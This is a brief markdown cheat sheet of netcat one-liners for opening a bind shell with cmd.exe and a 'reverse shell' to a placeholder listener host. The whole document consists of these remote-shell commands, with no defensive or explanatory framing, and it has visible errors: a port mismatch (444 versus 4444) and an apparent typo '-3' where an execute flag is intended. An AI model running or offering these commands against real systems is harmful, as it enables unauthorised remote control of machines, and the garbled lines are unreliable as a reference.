# Netcat Shells

#### Bind Shell w/ cmd shell

```bash
nc -nlvp 444 -e cmd.exe
nc -nv <target w/ listener> 4444 
```

#### Reverse Shell w/ cmd shell to listening host

```bash
nc -nlvp 4444
nc -nv <target w/ listener> 4444 -3 /bin/bash
```
